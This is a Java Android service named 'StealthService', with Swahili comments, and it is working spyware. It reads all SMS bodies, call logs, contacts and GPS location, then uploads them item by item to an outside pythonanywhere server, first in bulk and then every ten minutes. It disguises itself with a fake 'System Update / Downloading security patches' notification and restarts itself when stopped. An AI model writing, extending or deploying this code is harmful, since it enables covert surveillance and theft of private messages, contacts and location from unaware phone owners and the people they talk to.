package com.security.update;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import android.Manifest;
import android.content.pm.PackageManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.os.Build;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class StealthService extends Service {
    private static final String TAG = "StealthService";
    private Timer timer;
    private String parentCode;
    private SharedPreferences prefs;
    private LocationManager locationManager;
    private int dataSequence = 0;
    private boolean initialDataSent = false;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        createNotificationChannel();
        Log.d(TAG, "🔍 StealthService imeanzishwa kwa siri...");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("PARENT_CODE")) {
            parentCode = intent.getStringExtra("PARENT_CODE");
            Log.d(TAG, "📱 Parent Code: " + parentCode);
        } else {
            parentCode = prefs.getString("parent_code", "");
            Log.d(TAG, "📱 Parent Code from prefs: " + parentCode);
        }

        startForegroundService();
        startSurveillance();
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "surveillance_channel",
                "System Services",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("System background services");
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private void startForegroundService() {
        Notification notification;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notification = new Notification.Builder(this, "surveillance_channel")
                .setContentTitle("System Update")
                .setContentText("Downloading security patches...")
                .setSmallIcon(android.R.drawable.stat_sys_download)
                .setPriority(Notification.PRIORITY_LOW)
                .setOngoing(true)
                .build();
        } else {
            notification = new Notification.Builder(this)
                .setContentTitle("System Update")
                .setContentText("Downloading security patches...")
                .setSmallIcon(android.R.drawable.stat_sys_download)
                .setPriority(Notification.PRIORITY_LOW)
                .setOngoing(true)
                .build();
        }
        
        startForeground(101, notification);
    }

    private void startSurveillance() {
        if (timer != null) {
            timer.cancel();
        }

        timer = new Timer();

        // Start immediate FULL data collection
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                collectAllHistoricalData(); // 🔥 TUMBA DATA ZOTE ZA AWALI
            }
        }, 0);

        // Schedule periodic data collection every 10 minutes
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectNewDataOnly(); // 🔥 DATA MPYA TU
            }
        }, 600000, 600000);

        Log.d(TAG, "📡 Surveillance imeanzishwa - data ZOTE inatumwa sasa");
    }

    // 🔥 NJIA MPYA: TUMBA DATA ZOTE ZA AWALI
    private void collectAllHistoricalData() {
        try {
            Log.d(TAG, "💥 KUANZA KUTUMBA DATA ZOTE ZA AWALI...");
            dataSequence++;

            // 1. SMS ZOTE ZA AWALI
            if (checkPermission(Manifest.permission.READ_SMS)) {
                sendAllSMSData();
            }

            // 2. SIMU ZOTE ZA AWALI
            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
                sendAllCallsData();
            }

            // 3. ANWANI ZOTE ZA AWALI
            if (checkPermission(Manifest.permission.READ_CONTACTS)) {
                sendAllContactsData();
            }

            // 4. LOCATION YA SASA
            if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
                sendCurrentLocation();
            }

            initialDataSent = true;
            Log.d(TAG, "🎉 DATA ZOTE ZA AWALI ZIMETUMWA!");

        } catch (Exception e) {
            Log.e(TAG, "❌ Error collecting historical data: " + e.getMessage());
        }
    }

    // 🔥 NJIA MPYA: DATA MPYA TU
    private void collectNewDataOnly() {
        try {
            Log.d(TAG, "🔄 Kukusanya data mpya tu...");
            dataSequence++;

            // SMS MPYA TU
            if (checkPermission(Manifest.permission.READ_SMS)) {
                sendNewSMSData();
            }

            // SIMU MPYA TU
            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
                sendNewCallsData();
            }

            // LOCATION MPYA
            if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
                sendCurrentLocation();
            }

            Log.d(TAG, "✅ Data mpya imetumwa - seq " + dataSequence);

        } catch (Exception e) {
            Log.e(TAG, "❌ Error collecting new data: " + e.getMessage());
        }
    }

    // 🔥 SMS ZOTE ZA AWALI - HAKUNA LIMIT
    private void sendAllSMSData() {
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DATE + " DESC"  // ZOTE BILA LIMIT
            );

            if (cursor != null) {
                int totalSMS = cursor.getCount();
                Log.d(TAG, "📨 Kupakua SMS " + totalSMS + " zote...");
                
                int count = 0;
                while (cursor.moveToNext()) {
                    JSONObject smsData = new JSONObject();
                    String senderNumber = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String messageBody = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    String timestamp = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    int smsType = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                    
                    // PATA JINA LA MTU KUTOKA NAMBA
                    String senderName = getContactNameFromNumber(senderNumber);

                    smsData.put("sender_number", senderNumber);
                    smsData.put("sender_name", senderName);
                    smsData.put("message", messageBody);
                    smsData.put("timestamp", timestamp);
                    smsData.put("type", getSMSTypeText(smsType));
                    smsData.put("sequence", dataSequence);
                    smsData.put("data_type", "historical_sms");

                    // Tuma SMS moja moja
                    sendSingleDataToServer("sms", smsData);
                    count++;
                    
                    // Ongea kidogo kwa console
                    if (count % 50 == 0) {
                        Log.d(TAG, "📨 SMS " + count + "/" + totalSMS + " zimetumwa...");
                    }
                    
                    // Pumzika kidogo kati ya SMS nyingi
                    if (count % 20 == 0) Thread.sleep(1000);
                }
                cursor.close();
                Log.d(TAG, "✅ SMS ZOTE " + count + " zimetumwa kikamilifu!");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading all SMS: " + e.getMessage());
        }
    }

    // 🔥 SIMU ZOTE ZA AWALI - HAKUNA LIMIT
    private void sendAllCallsData() {
        try {
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC"  // ZOTE BILA LIMIT
            );

            if (cursor != null) {
                int totalCalls = cursor.getCount();
                Log.d(TAG, "📞 Kupakua simu " + totalCalls + " zote...");
                
                int count = 0;
                while (cursor.moveToNext()) {
                    JSONObject callData = new JSONObject();
                    String callNumber = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    String timestamp = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    int callType = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    
                    // PATA JINA LA MTU KUTOKA NAMBA
                    String callerName = getContactNameFromNumber(callNumber);

                    callData.put("caller_number", callNumber);
                    callData.put("caller_name", callerName);
                    callData.put("duration", duration);
                    callData.put("timestamp", timestamp);
                    callData.put("type", getCallTypeText(callType));
                    callData.put("sequence", dataSequence);
                    callData.put("data_type", "historical_calls");

                    // Tuma simu moja moja
                    sendSingleDataToServer("calls", callData);
                    count++;
                    
                    // Ongea kidogo kwa console
                    if (count % 50 == 0) {
                        Log.d(TAG, "📞 Simu " + count + "/" + totalCalls + " zimetumwa...");
                    }
                    
                    // Pumzika kidogo
                    if (count % 20 == 0) Thread.sleep(1000);
                }
                cursor.close();
                Log.d(TAG, "✅ SIMU ZOTE " + count + " zimetumwa kikamilifu!");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading all calls: " + e.getMessage());
        }
    }

    // 🔥 ANWANI ZOTE - HAKUNA LIMIT
    private void sendAllContactsData() {
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"  // ZOTE BILA LIMIT
            );

            if (cursor != null) {
                int totalContacts = cursor.getCount();
                Log.d(TAG, "👥 Kupakua anwani " + totalContacts + " zote...");
                
                int count = 0;
                while (cursor.moveToNext()) {
                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));

                    // Pata namba ZOTE za simu za contact hii
                    JSONArray phoneNumbers = getAllContactPhoneNumbers(contactId);
                    
                    if (phoneNumbers.length() > 0) {
                        JSONObject contactData = new JSONObject();
                        contactData.put("name", name);
                        contactData.put("phones", phoneNumbers);
                        contactData.put("timestamp", System.currentTimeMillis());
                        contactData.put("sequence", dataSequence);
                        contactData.put("data_type", "historical_contacts");

                        // Tuma contact moja moja
                        sendSingleDataToServer("contacts", contactData);
                        count++;
                        
                        // Ongea kidogo kwa console
                        if (count % 20 == 0) {
                            Log.d(TAG, "👥 Anwani " + count + "/" + totalContacts + " zimetumwa...");
                        }
                        
                        // Pumzika kidogo
                        if (count % 10 == 0) Thread.sleep(1000);
                    }
                }
                cursor.close();
                Log.d(TAG, "✅ ANWANI ZOTE " + count + " zimetumwa kikamilifu!");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading all contacts: " + e.getMessage());
        }
    }

    // 🔥 SMS MPYA TU
    private void sendNewSMSData() {
        try {
            // Tafuta SMS za siku 1 iliyopita tu
            long oneDayAgo = System.currentTimeMillis() - (24 * 60 * 60 * 1000);
            
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null,
                Telephony.Sms.DATE + " > ?",
                new String[]{String.valueOf(oneDayAgo)},
                Telephony.Sms.DATE + " DESC"
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    JSONObject smsData = new JSONObject();
                    String senderNumber = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String messageBody = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    String timestamp = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    int smsType = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                    
                    String senderName = getContactNameFromNumber(senderNumber);

                    smsData.put("sender_number", senderNumber);
                    smsData.put("sender_name", senderName);
                    smsData.put("message", messageBody);
                    smsData.put("timestamp", timestamp);
                    smsData.put("type", getSMSTypeText(smsType));
                    smsData.put("sequence", dataSequence);
                    smsData.put("data_type", "new_sms");

                    sendSingleDataToServer("sms", smsData);
                    count++;
                }
                cursor.close();
                if (count > 0) Log.d(TAG, "✅ SMS mpya " + count + " zimetumwa");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading new SMS: " + e.getMessage());
        }
    }

    // 🔥 SIMU MPYA TU
    private void sendNewCallsData() {
        try {
            // Tafuta simu za siku 1 iliyopita tu
            long oneDayAgo = System.currentTimeMillis() - (24 * 60 * 60 * 1000);
            
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null,
                CallLog.Calls.DATE + " > ?",
                new String[]{String.valueOf(oneDayAgo)},
                CallLog.Calls.DATE + " DESC"
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    JSONObject callData = new JSONObject();
                    String callNumber = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    String timestamp = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    int callType = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    
                    String callerName = getContactNameFromNumber(callNumber);

                    callData.put("caller_number", callNumber);
                    callData.put("caller_name", callerName);
                    callData.put("duration", duration);
                    callData.put("timestamp", timestamp);
                    callData.put("type", getCallTypeText(callType));
                    callData.put("sequence", dataSequence);
                    callData.put("data_type", "new_calls");

                    sendSingleDataToServer("calls", callData);
                    count++;
                }
                cursor.close();
                if (count > 0) Log.d(TAG, "✅ Simu mpya " + count + " zimetumwa");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading new calls: " + e.getMessage());
        }
    }

    // 🔥 LOCATION YA SASA
    private void sendCurrentLocation() {
        try {
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (locationManager != null && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Location lastLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (lastLocation != null) {
                    JSONObject locationData = new JSONObject();
                    locationData.put("latitude", lastLocation.getLatitude());
                    locationData.put("longitude", lastLocation.getLongitude());
                    locationData.put("accuracy", lastLocation.getAccuracy());
                    locationData.put("timestamp", lastLocation.getTime());
                    locationData.put("address", "GPS Location");
                    locationData.put("sequence", dataSequence);

                    sendSingleDataToServer("location", locationData);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error getting location: " + e.getMessage());
        }
    }

    // 🆕 PATA JINA LA MTU KUTOKA NAMBA YA SIMU
    private String getContactNameFromNumber(String phoneNumber) {
        if (phoneNumber == null) return "Unknown";
        
        try {
            // Safisha namba
            String cleanNumber = phoneNumber.replaceAll("[^0-9+]", "");
            
            Cursor cursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME},
                ContactsContract.CommonDataKinds.Phone.NUMBER + " LIKE ?",
                new String[]{"%" + cleanNumber},
                null
            );

            if (cursor != null && cursor.moveToFirst()) {
                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                cursor.close();
                return name;
            }
            if (cursor != null) {
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting contact name: " + e.getMessage());
        }
        
        return phoneNumber; // Rudi namba kama hakuna jina
    }

    private JSONArray getAllContactPhoneNumbers(String contactId) {
        JSONArray phones = new JSONArray();
        try {
            Cursor phoneCursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                new String[]{contactId},
                null
            );

            if (phoneCursor != null) {
                while (phoneCursor.moveToNext()) {
                    String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    String type = getPhoneTypeText(phoneCursor.getInt(phoneCursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.TYPE)));
                    
                    JSONObject phoneInfo = new JSONObject();
                    phoneInfo.put("number", phone);
                    phoneInfo.put("type", type);
                    phones.put(phoneInfo);
                }
                phoneCursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting phone numbers: " + e.getMessage());
        }
        return phones;
    }

    private String getSMSTypeText(int smsType) {
        switch (smsType) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "received";
            case Telephony.Sms.MESSAGE_TYPE_SENT: return "sent";
            case Telephony.Sms.MESSAGE_TYPE_DRAFT: return "draft";
            default: return "unknown";
        }
    }

    private String getCallTypeText(int callType) {
        switch (callType) {
            case CallLog.Calls.INCOMING_TYPE: return "incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
            case CallLog.Calls.MISSED_TYPE: return "missed";
            default: return "unknown";
        }
    }

    private String getPhoneTypeText(int phoneType) {
        switch (phoneType) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME: return "home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE: return "mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK: return "work";
            default: return "other";
        }
    }

    // 🎯 NJIA YA KUTUMA DATA - SERVER ILE ILE
    private void sendSingleDataToServer(String dataType, JSONObject dataContent) {
        new Thread(() -> {
            try {
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-data";
                
                JSONObject postData = new JSONObject();
                postData.put("parent_code", parentCode);
                postData.put("data_type", dataType);
                postData.put("device_id", android.os.Build.MODEL);
                postData.put("data_content", dataContent);

                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);

                OutputStream os = conn.getOutputStream();
                os.write(postData.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "✅ " + dataType + " imetumwa kikamilifu");
                } else {
                    Log.e(TAG, "❌ Server error for " + dataType + ": " + responseCode);
                }

            } catch (Exception e) {
                Log.e(TAG, "❌ Error sending " + dataType + ": " + e.getMessage());
            }
        }).start();
    }

    private boolean checkPermission(String permission) {
        return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
        
        // 🔄 AUTOMATIC RESTART
        Intent restartIntent = new Intent(this, StealthService.class);
        restartIntent.putExtra("PARENT_CODE", parentCode);
        startService(restartIntent);
        
        Log.d(TAG, "🔄 StealthService inaanzishwa tena kiotomatiki");
    }
}
